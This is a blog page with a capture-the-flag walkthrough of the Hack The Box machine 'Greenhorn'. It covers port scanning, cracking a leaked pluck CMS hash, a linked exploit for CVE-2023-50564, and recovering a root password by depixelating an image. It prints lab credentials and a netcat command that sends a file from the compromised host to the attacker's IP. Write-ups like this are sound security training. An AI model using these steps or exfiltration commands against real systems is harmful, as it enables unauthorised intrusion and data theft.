<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="HTB - Linux - Easy" />
<meta name="keywords" content=", linux" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/walkthroughs/greenhorn/" />


    <title>
        
            Greenhorn :: TheFizzyFish 
        
    </title>





<link rel="stylesheet" href="/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="Greenhorn">
  <meta itemprop="description" content="HTB - Linux - Easy">
  <meta itemprop="datePublished" content="2024-08-24T16:50:47-04:00">
  <meta itemprop="dateModified" content="2024-08-24T16:50:47-04:00">
  <meta itemprop="wordCount" content="573">
  <meta itemprop="image" content="http://localhost:1313/">
  <meta itemprop="keywords" content="Linux">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/">
  <meta name="twitter:title" content="Greenhorn">
  <meta name="twitter:description" content="HTB - Linux - Easy">







    <meta property="article:published_time" content="2024-08-24 16:50:47 -0400 EDT" />











    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text ">
                $ cd /root/</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/common/">Common.txt</a></li><li><a href="/walkthroughs/">Walkthroughs</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/walkthroughs/greenhorn/">Greenhorn</a></h2>

            
            
            

            <div class="post-content">
                <h1 id="enum">Enum</h1>
<h2 id="port-scanning">Port Scanning</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp   open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://greenhorn.htb/
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>3000/tcp open  ppp?
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   GenericLines, Help, RTSPRequest: 
</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     Connection: close
</span></span><span style="display:flex;"><span>|     Request
</span></span></code></pre></div><h2 id="80-nginx-1180">80/ nginx 1.18.0</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>80/tcp   open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://greenhorn.htb/
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/login.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1242<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://greenhorn.htb/images/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/admin.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4026<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/install.php          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4035<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/files                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://greenhorn.htb/files/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/data                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://greenhorn.htb/data/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/docs                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://greenhorn.htb/docs/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/requirements.php     <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4047<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>We find a hostname to add to our /etc/hosts <code>greenhorn.htb</code>. Checked for vhosts and didn&rsquo;t find any.</p>
<p>Powered by pluck</p>
<p><code>login.php</code> file gives us a version <code>pluck 4.7.18</code></p>
<p>Checking searchsploit shows a potential exploit</p>
<p>We need to be authenticated to run it.</p>
<h2 id="3000http">3000/http</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/admin                <span style="color:#f92672">(</span>Status: 303<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 38<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /user/login<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/v2                   <span style="color:#f92672">(</span>Status: 401<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 50<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/issues               <span style="color:#f92672">(</span>Status: 303<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 38<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /user/login<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/explore              <span style="color:#f92672">(</span>Status: 303<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 41<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /explore/repos<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/notifications        <span style="color:#f92672">(</span>Status: 303<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 38<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /user/login<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/milestones           <span style="color:#f92672">(</span>Status: 303<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 38<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /user/login<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>No vhosts found.</p>
<p>Found a version on the <code>/admin</code> page</p>
<p><code>[Powered by Gitea](https://about.gitea.com) Version: 1.21.11</code></p>
<p>This looks to be a pretty recent version</p>
<p>Since we know we need a password to login as admin to the pluck app on port 80, we can check the gitea site and see if we can find any creds within the repo or within past commits.</p>
<p>Start by cloning the repo locally:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/greenhorn<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ git clone http://greenhorn.htb:3000/GreenAdmin/GreenHorn.git
</span></span></code></pre></div><p>Nothing interesting there, just the one commit for the repo. Looking at documentation for pluck, we see it doesn&rsquo;t use a database but stores everything in files. Did the new dev upload that file as well? yep</p>
<p>We can crack the hash with hashcat:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/greenhorn/GreenHorn/files<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt -m <span style="color:#ae81ff">1700</span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1
</span></span></code></pre></div><p><code>admin:iloveyou1</code> allows us to login and now we can try the rce exploit (CVE-2023-50564).</p>
<hr>
<h1 id="foothold">Foothold</h1>
<p>Created a python script to exploit this in one shot &raquo; <a href="https://raw.githubusercontent.com/thefizzyfish/CVE-2023-50564-pluck/main/CVE-2023-50564.py">https://raw.githubusercontent.com/thefizzyfish/CVE-2023-50564-pluck/main/CVE-2023-50564.py</a></p>
<p>We can list what&rsquo;s in <code>junior</code>&rsquo;s home dir but can&rsquo;t read the flag</p>
<h2 id="exploits">Exploits</h2>
<p>CVE-2023-50564
<a href="https://github.com/thefizzyfish/CVE-2023-50564-pluck">https://github.com/thefizzyfish/CVE-2023-50564-pluck</a></p>
<hr>
<h1 id="privesc">PrivEsc</h1>
<p>We can&rsquo;t ssh into the box as junior with the <code>iloveyou1</code> password as it requires public keys.</p>
<p>We can switch to junior with <code>su</code></p>
<p>Interesting linpeas output:</p>
<p>We could try replacing the gitea executable with a rev shell to pivot to the gitea user?
That might be rabbit hole as the file is busy whenever I try to replace it</p>
<p>Looking back at <code>junior</code>&rsquo;s home directory finds an interesting pdf we can send to our box to take a look at</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># On remote host</span>
</span></span><span style="display:flex;"><span>junior@greenhorn:~$ ls
</span></span><span style="display:flex;"><span> user.txt  <span style="color:#e6db74">&#39;Using OpenVAS.pdf&#39;</span>
</span></span><span style="display:flex;"><span>junior@greenhorn:~$ cat <span style="color:#e6db74">&#39;Using OpenVAS.pdf&#39;</span> | nc 10.10.14.7 <span style="color:#ae81ff">1234</span>
</span></span><span style="display:flex;"><span>junior@greenhorn:~$ 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On local host</span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/greenhorn<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nc -l -p <span style="color:#ae81ff">1234</span> -q <span style="color:#ae81ff">1</span> &gt; <span style="color:#e6db74">&#39;Using OpenVAS.pdf&#39;</span> &lt; /dev/null
</span></span></code></pre></div><p>Interesting but checking the file system for openvas doesn&rsquo;t turn anything up. We can try to depixilate the password with a tool named <code>depix</code> &raquo; <a href="https://github.com/spipm/Depix">https://github.com/spipm/Depix</a></p>
<p>First extract the image from the pdf</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/greenhorn<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ pdfimages <span style="color:#e6db74">&#34;./Using OpenVAS.pdf&#34;</span> greenhorn
</span></span></code></pre></div><p>Run the tool against the created image:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/greenhorn<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python3 Depix/depix.py -p greenhorn-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>2024-08-24 16:20:06,891 - Saving output image to: output.png
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>root:sidefromsidetheothersidesidefromsidetheotherside
</span></span></code></pre></div><p>And that&rsquo;s all folks</p>
<h2 id="exploits-1">Exploits</h2>
<hr>
<h1 id="postpivot">Post/Pivot</h1>
<hr>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="http://localhost:1313/tags/linux/">linux</a></span>
        
    </p>

            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/"></a></span>
            <span></span>
            
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by Four Gnomes in a Hoodie</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>




    </body>
</html>
